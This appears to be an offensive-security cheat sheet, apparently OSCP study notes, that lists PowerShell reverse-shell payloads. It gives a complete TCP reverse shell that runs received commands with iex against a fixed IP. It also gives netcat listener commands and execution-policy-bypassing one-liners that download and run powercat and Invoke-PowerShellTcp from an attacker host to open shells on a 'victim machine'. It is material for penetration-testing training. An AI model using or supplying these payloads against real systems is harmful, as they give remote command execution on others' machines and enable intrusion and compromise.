# PowerShell

## PowerShell

#### On victim machine

```text
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```

## Powercat

#### Listener

Start netcat listener on your Kali

```text
nc -lvnp 9001
```

#### On victim machine 

```text
powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/oscp/exploitation/rev_shells/powershell/powercat/powercat.ps1'));powercat -c <IP> -p <Port> -ep"
```

#### Shortent

```text
powershell.exe -nop -ep bypass -c "iex (iwr http://<IP>/oscp/exploitation/rev_shells/powershell/powercat/powercat.ps1);powercat -c <IP> -p <PORT> -ep"
```

## Invoke-PowerShellTcp.ps1

#### Listener

Start netcat listener on your Kali

```text
nc -lvnp 9001
```

#### On victim machine 

```text
powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"
```

